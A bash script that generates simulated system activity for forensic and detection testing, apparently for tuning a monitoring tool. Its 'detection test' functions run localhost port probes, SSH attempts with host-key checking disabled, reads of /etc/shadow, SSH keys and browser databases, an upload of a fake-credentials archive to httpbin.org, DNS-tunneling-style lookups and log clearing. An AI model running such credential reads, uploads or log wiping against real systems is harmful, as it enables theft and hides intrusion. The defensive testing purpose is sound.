#!/bin/bash
# Enhanced Activity Generation for Forensic Testing
# Generates realistic syscalls, file operations, and network connections

set -e

# Colors for output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${GREEN}[+] Enhanced Forensic Activity Generator${NC}"
echo "[+] This script generates:"
echo "    - File I/O operations (create, read, write, delete)"
echo "    - Network connections (HTTP/HTTPS, DNS, SSH attempts)"
echo "    - Process operations (fork, exec, clone)"
echo "    - Suspicious patterns (for detection testing)"
echo ""

DURATION=${1:-60}  # Default 60 seconds
echo -e "${GREEN}[+] Running for ${DURATION} seconds...${NC}"

START_TIME=$(date +%s)
END_TIME=$((START_TIME + DURATION))

# Create temporary directories
WORK_DIR=$(mktemp -d)
LOG_DIR="$WORK_DIR/logs"
DATA_DIR="$WORK_DIR/data"
DOWNLOAD_DIR="$WORK_DIR/downloads"

mkdir -p "$LOG_DIR" "$DATA_DIR" "$DOWNLOAD_DIR"
echo -e "${CYAN}[*] Work directory: $WORK_DIR${NC}"

# ============================================================
# NORMAL ACTIVITY FUNCTIONS
# ============================================================

generate_file_io() {
    echo "[*] File I/O operations..."

    # Create various file types
    echo "Application data $(date)" > "$DATA_DIR/app_config.json"
    echo "User settings $(date)" > "$DATA_DIR/user_prefs.xml"
    dd if=/dev/urandom of="$DATA_DIR/binary.dat" bs=1K count=10 2>/dev/null

    # Read operations
    cat "$DATA_DIR/app_config.json" > /dev/null
    head -n 5 "$DATA_DIR/user_prefs.xml" > /dev/null

    # Write operations
    for i in {1..5}; do
        echo "Log entry $i at $(date)" >> "$LOG_DIR/application.log"
    done

    # File metadata operations
    ls -la "$DATA_DIR" > /dev/null
    stat "$DATA_DIR/app_config.json" > /dev/null 2>&1 || true

    # Copy and move operations
    cp "$DATA_DIR/app_config.json" "$DATA_DIR/app_config.backup"
    mv "$DATA_DIR/app_config.backup" "$DATA_DIR/app_config.old" 2>/dev/null || true

    # Delete operations
    rm -f "$DATA_DIR/app_config.old" 2>/dev/null || true
}

generate_network_activity() {
    echo "[*] Network activity..."

    # DNS lookups - various domains
    nslookup google.com > /dev/null 2>&1 || true
    nslookup github.com > /dev/null 2>&1 || true
    nslookup amazon.com > /dev/null 2>&1 || true
    nslookup stackoverflow.com > /dev/null 2>&1 || true

    # HTTPS requests to legitimate sites
    curl -s -m 5 https://www.google.com > "$DOWNLOAD_DIR/google.html" 2>&1 || true
    curl -s -m 5 https://api.github.com/zen > "$DOWNLOAD_DIR/github_api.txt" 2>&1 || true
    curl -s -m 5 https://httpbin.org/ip > "$DOWNLOAD_DIR/ip_info.json" 2>&1 || true

    # Simulate API calls
    curl -s -m 5 -X POST https://httpbin.org/post \
        -H "Content-Type: application/json" \
        -d '{"test": "data", "timestamp": "'$(date +%s)'"}' > /dev/null 2>&1 || true

    # HTTP requests (less common now)
    curl -s -m 5 http://example.com > /dev/null 2>&1 || true
}

generate_process_activity() {
    echo "[*] Process operations..."

    # Standard system commands
    whoami > /dev/null
    hostname > /dev/null
    uname -a > /dev/null
    date > /dev/null
    uptime > /dev/null

    # Process listing and monitoring
    ps aux | head -20 > "$LOG_DIR/processes.txt"
    top -b -n 1 | head -20 > "$LOG_DIR/top_snapshot.txt" 2>/dev/null || true

    # Child processes (fork/exec)
    (sleep 1; echo "Child process 1") > /dev/null 2>&1 &
    (sleep 1; ls -la /tmp > /dev/null) > /dev/null 2>&1 &
    (sleep 1; date > /dev/null) > /dev/null 2>&1 &

    # Wait for some children
    wait 2>/dev/null || true
}

generate_system_monitoring() {
    echo "[*] System monitoring activity..."

    # Check disk usage
    df -h > "$LOG_DIR/disk_usage.txt" 2>/dev/null || true
    du -sh "$WORK_DIR" > /dev/null 2>&1 || true

    # Memory information
    free -h > "$LOG_DIR/memory.txt" 2>/dev/null || true

    # Network interfaces
    ip addr show > "$LOG_DIR/interfaces.txt" 2>/dev/null || true
    ss -tunap > "$LOG_DIR/connections.txt" 2>/dev/null || true

    # System logs (read only)
    tail -n 10 /var/log/syslog > /dev/null 2>&1 || true
}

# ============================================================
# SUSPICIOUS ACTIVITY FUNCTIONS (for detection testing)
# ============================================================

generate_recon_activity() {
    echo "[*] Reconnaissance activity (detection test)..."

    # Network scanning patterns
    timeout 2 nc -zv localhost 22 > /dev/null 2>&1 || true
    timeout 2 nc -zv localhost 80 > /dev/null 2>&1 || true
    timeout 2 nc -zv localhost 443 > /dev/null 2>&1 || true

    # Port scanning localhost
    for port in 3306 5432 6379 27017; do
        timeout 1 bash -c "echo > /dev/tcp/localhost/$port" > /dev/null 2>&1 || true
    done

    # DNS enumeration
    nslookup -type=mx google.com > /dev/null 2>&1 || true
    nslookup -type=txt google.com > /dev/null 2>&1 || true
}

generate_lateral_movement_sim() {
    echo "[*] Lateral movement simulation (detection test)..."

    # SSH connection attempts (to localhost, will fail but generates events)
    timeout 2 ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no localhost whoami > /dev/null 2>&1 || true
    timeout 2 ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no 127.0.0.1 uname > /dev/null 2>&1 || true

    # Remote command execution simulation
    (bash -c "whoami; hostname; uname -a" > "$LOG_DIR/remote_exec.txt") &
}

generate_persistence_sim() {
    echo "[*] Persistence simulation (detection test)..."

    # Cron-like behavior (checking scheduled tasks)
    crontab -l > /dev/null 2>&1 || true

    # Systemd service enumeration
    systemctl list-units --type=service --state=running > "$LOG_DIR/services.txt" 2>/dev/null || true

    # User account enumeration
    cat /etc/passwd | grep -E "bash|sh" > "$LOG_DIR/users.txt" 2>/dev/null || true
    groups > /dev/null 2>&1 || true
}

generate_exfiltration_sim() {
    echo "[*] Data exfiltration simulation (detection test)..."

    # Create "sensitive" data file
    cat > "$DATA_DIR/sensitive_data.txt" << EOF
Username: admin
Password: hunter2
API_KEY: sk-test123456789
DATABASE_URL: postgresql://user:pass@db.example.com/dbname
EOF

    # Compress data (common exfil technique)
    tar -czf "$DATA_DIR/backup.tar.gz" "$DATA_DIR/sensitive_data.txt" 2>/dev/null || true

    # Simulate upload attempt (to httpbin, safe)
    curl -s -m 5 -X POST https://httpbin.org/post \
        -F "file=@$DATA_DIR/backup.tar.gz" > /dev/null 2>&1 || true

    # DNS tunneling simulation (just DNS queries with data-like patterns)
    for i in $(seq 1 3); do
        nslookup "$(head -c 8 /dev/urandom | base64 | tr -d '=/+' | tr '[:upper:]' '[:lower:]').example.com" > /dev/null 2>&1 || true
    done
}

generate_credential_access_sim() {
    echo "[*] Credential access simulation (detection test)..."

    # Read shadow file (will fail without sudo, generates event)
    cat /etc/shadow > /dev/null 2>&1 || true

    # SSH key enumeration
    ls -la ~/.ssh/ > /dev/null 2>&1 || true
    cat ~/.ssh/known_hosts > /dev/null 2>&1 || true

    # Browser data access (common credential theft target)
    find ~ -name "*.db" -path "*/Browser/*" 2>/dev/null | head -5 > /dev/null || true
}

generate_evasion_sim() {
    echo "[*] Evasion simulation (detection test)..."

    # Hidden files
    touch "$DATA_DIR/.hidden_config"
    echo "Hidden data" > "$DATA_DIR/.hidden_config"

    # Temp directory usage
    echo "Temp data" > /tmp/.tmp_file_$$
    rm -f /tmp/.tmp_file_$$ 2>/dev/null || true

    # Log deletion simulation
    > "$LOG_DIR/application.log" 2>/dev/null || true

    # Process hiding simulation (just backgrounding)
    (sleep 5) > /dev/null 2>&1 &
}

# ============================================================
# ADVANCED ACTIVITY PATTERNS
# ============================================================

generate_web_browsing_sim() {
    echo "[*] Web browsing simulation..."

    # Simulate user browsing multiple sites
    curl -s -m 5 -A "Mozilla/5.0" https://news.ycombinator.com > /dev/null 2>&1 || true
    curl -s -m 5 -A "Mozilla/5.0" https://reddit.com > /dev/null 2>&1 || true
    curl -s -m 5 -A "Mozilla/5.0" https://stackoverflow.com > /dev/null 2>&1 || true

    # Image downloads
    curl -s -m 5 https://httpbin.org/image/png > "$DOWNLOAD_DIR/image.png" 2>&1 || true
    curl -s -m 5 https://httpbin.org/image/jpeg > "$DOWNLOAD_DIR/image.jpg" 2>&1 || true
}

generate_dev_activity_sim() {
    echo "[*] Development activity simulation..."

    # Git-like operations (if git exists)
    if command -v git &> /dev/null; then
        git config --global user.name > /dev/null 2>&1 || true
        git status > /dev/null 2>&1 || true
    fi

    # Package manager queries
    which python3 > /dev/null 2>&1 || true
    which node > /dev/null 2>&1 || true
    which docker > /dev/null 2>&1 || true

    # Create source files
    cat > "$DATA_DIR/script.py" << 'EOF'
#!/usr/bin/env python3
import sys
import os

def main():
    print("Hello from generated script")
    print(f"Current directory: {os.getcwd()}")

if __name__ == "__main__":
    main()
EOF

    # Execute it
    chmod +x "$DATA_DIR/script.py"
    python3 "$DATA_DIR/script.py" > /dev/null 2>&1 || true
}

# ============================================================
# MAIN EXECUTION LOOP
# ============================================================

echo ""
echo -e "${GREEN}[+] Activity generation started at $(date)${NC}"
echo ""

ITERATION=1
ACTIVITY_TYPE=1

while [ $(date +%s) -lt $END_TIME ]; do
    echo -e "${YELLOW}=== Iteration $ITERATION ($(date +%H:%M:%S)) ===${NC}"

    # Rotate through different activity patterns
    case $((ACTIVITY_TYPE % 6)) in
        0)
            generate_file_io
            generate_network_activity
            generate_process_activity
            ;;
        1)
            generate_system_monitoring
            generate_web_browsing_sim
            ;;
        2)
            generate_recon_activity
            generate_lateral_movement_sim
            ;;
        3)
            generate_dev_activity_sim
            generate_network_activity
            ;;
        4)
            generate_persistence_sim
            generate_credential_access_sim
            ;;
        5)
            generate_exfiltration_sim
            generate_evasion_sim
            ;;
    esac

    echo ""
    ITERATION=$((ITERATION + 1))
    ACTIVITY_TYPE=$((ACTIVITY_TYPE + 1))

    # Variable sleep to make it less predictable
    sleep $((2 + RANDOM % 3))
done

echo ""
echo -e "${GREEN}[+] Activity generation completed at $(date)${NC}"
echo -e "${GREEN}[+] Total iterations: $ITERATION${NC}"
echo -e "${GREEN}[+] Cleaning up temporary files...${NC}"

# Cleanup
rm -rf "$WORK_DIR"

echo -e "${GREEN}[+] Done!${NC}"
